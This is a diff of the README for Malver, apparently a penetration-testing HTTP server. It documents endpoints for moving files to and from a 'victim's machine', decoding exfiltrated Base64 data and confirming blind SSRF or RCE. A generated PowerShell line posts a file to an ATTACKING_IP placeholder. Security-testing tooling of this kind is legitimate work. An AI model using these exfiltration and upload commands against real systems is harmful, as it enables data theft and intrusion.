@@ -2,19 +2,16 @@
 
 ## Overview
 
-Malver (**Mal**icious Ser**ver**) is a lightweight HTTP server designed to simplify common tasks in penetration testing and bug bounty hunting. It allows security researchers to efficiently decode Base64 data, validate blind vulnerabilities, and transfer files to and from a compromised system.
-
-
+Malver (**Mal**cious Ser**ver**) is a lightweight and flexible HTTP server designed for penetration testing and bug bounty hunting. It simplifies file transfers, data exfiltration, and blind vulnerability validation.
 
 ## Features
 
-- Base64 Decoding – Quickly decode attacker-controlled data.
-- File Transfer – Upload/download files in engagements.
-- Blind Vulnerability Testing – Use `/` to validate SSRF, RCE, or command injection.
-- Configurable – Customize endpoint paths and directories via CLI.
-- Logging – Outputs structured logs for tracking interactions.
-- Upload Command Generator – Automatically generate ready-to-use upload commands for upload feature.
-
+- File Transfer (Upload & Download) – Easily upload and download files during engagements.
+- Upload Command Generator – Generate ready-to-use upload commands with multiple options for tightly hardened environments.
+- Base64 Decoding – Decode attacker-controlled data via the /b64d endpoint.
+- Blind Vulnerability Validation – Use / for testing SSRF, RCE, or command injection scenarios.
+- Configurable Endpoints & Directories – Customize paths and storage locations through CLI flags.
+- Structured Logging – Log requests, headers, and query parameters in a tabular format for easy analysis.
 
 
 ## Endpoints
@@ -25,7 +22,6 @@ Malver (**Mal**icious Ser**ver**) is a lightweight HTTP server designed to simpl
 | GET | `/down/{filename}` | Downloads a file from the victim’s machine.|
 | POST | `/up` | Uploads a file from the victim’s machine to the attacker's system.|
 | GET | `/b64d?d=<encoded>` | Decodes Base64-encoded query data.|
-
 
 
 ## Installation
@@ -39,13 +35,11 @@ go install github.com/omarelshopky/malver/cmd/malver@latest
 This will install the malver binary in your Go bin directory.
 
 
-
 ## Usage
 
 ```bash
-malver [-headers] [-port=3000] [-upload=./uploads] [-download=./downloads] [-ping-endpoint=/] [-down-endpoint=/down] [-up-endpoint=/up] [-b64d-endpoint=/b64d]
+malver [-headers] [-params] [-port=3000] [-upload=./uploads] [-download=./downloads] [-ping-endpoint=/] [-down-endpoint=/down] [-up-endpoint=/up] [-b64d-endpoint=/b64d]
 ```
-
 
 
 ## Command-Line Flags
@@ -53,6 +47,7 @@ malver [-headers] [-port=3000] [-upload=./uploads] [-download=./downloads] [-pin
 | Flag | Default | Description |
 | ---- | ---- | ---- |
 | `-headers` | `false` | Log request headers |
+| `-params` | `false` | Log request query parameters |
 | `-port` | `3000` | Port to run the HTTP server on |
 | `-upload` | `./uploads` | Directory for file uploads |
 | `-download` | `./downloads` | Directory for file downloads |
@@ -65,15 +60,12 @@ malver [-headers] [-port=3000] [-upload=./uploads] [-download=./downloads] [-pin
 | `-file` | `<FILE_PATH>` | Specify the full path of the file to be uploaded (used with -upload-commands) |
 
 
-
 ## Example Use Cases
 
 - Send a request to `/` and check if the target system can reach back.
 - Extract and decode data sent from an exploited machine using `/b64d?q=<encoded>`
 - Retrieving files from a compromised machine using `/down/{filename}` to download files.
-- Upload a shell or tool using the `/up` endpoint. Use `-upload-commands` to generate pre-configured upload commands that can be executed on the victim machine using various built-in tools.
-
-
+- Upload a shell or tool using the `/up` endpoint. Use `-upload-cmds` to generate pre-configured upload commands that can be executed on the victim machine using various built-in tools.
 
 
 ### Generating Upload Commands
@@ -81,7 +73,7 @@ malver [-headers] [-port=3000] [-upload=./uploads] [-download=./downloads] [-pin
 To quickly generate ready-to-use upload commands, use:
 
 ```bash
-malver -upload-commands -ip <ATTACKING_IP> -file <FILE_PATH>
+malver -upload-cmds -ip <ATTACKING_IP> -file <FILE_PATH>
 ```
 
 Example output:
@@ -129,17 +121,54 @@ Invoke-RestMethod -Uri "http://<ATTACKING_IP>:3000/up" -Method Post -InFile "<FI
 ```
 
 
-
 ## Logging
 
-All requests are logged in the following format:
+The server logs all incoming requests in the following format:
 
 ```bash
-<DATE> <TIME> <CLIENT_IP>:<CLIENT_PORT> "<METHOD> <ENDPOINT><QUERY_PARAMS> HTTP/<HTTP_VERSION>" <STATUS_CODE> - [<POST_DATA>] <ENDPOINT_SPECIFIC_MESSAGE>
+<DATE> <TIME> <CLIENT_IP>:<CLIENT_PORT> "<METHOD> <ENDPOINT><QUERY_PARAMS> HTTP/<HTTP_VERSION>" <STATUS_CODE> [<POST_DATA>] | <ENDPOINT_SPECIFIC_MESSAGE>
 ```
 
-This helps track interactions with the server, including query parameters, POST data, and decoded Base64 content.
+### Verbose Logging
 
+For more detailed insights, you can enable additional logging using:
+
+- `-headers` → Logs request headers in a tabular format.
+
+- `-params` → Logs query parameters in a structured table.
+
+### Example Log Output
+
+```bash
+2025/03/24 22:22:59 Starting server on :3000
+2025/03/24 22:23:01 127.0.0.1:46266 "GET /b64d?d=bWFsdmVyCg== HTTP/1.1" 200 - | decoded: malver
+```
+
+If `-headers` or `-params` is enabled, additional structured logging will be displayed:
+
+### Logged Headers
+
+```bash
+┌────────────┬─────────────┐
+│ Header     │ Value       │
+├────────────┼─────────────┤
+│ User-Agent │ curl/8.12.1 │
+│ Accept     │ */*         │
+└────────────┴─────────────┘
+```
+
+### Logged Query Parameters
+
+```bash
+┌───────────┬──────────┐
+│ Parameter │ Value    │
+├───────────┼──────────┤
+│ name      │ 3l5h0pky │
+│ id        │ 1        │
+└───────────┴──────────┘
+```
+
+This structured logging helps track client interactions, including query parameters, POST data, and Base64-decoded content, making debugging and auditing more efficient.
 
 
 ## Disclaimer
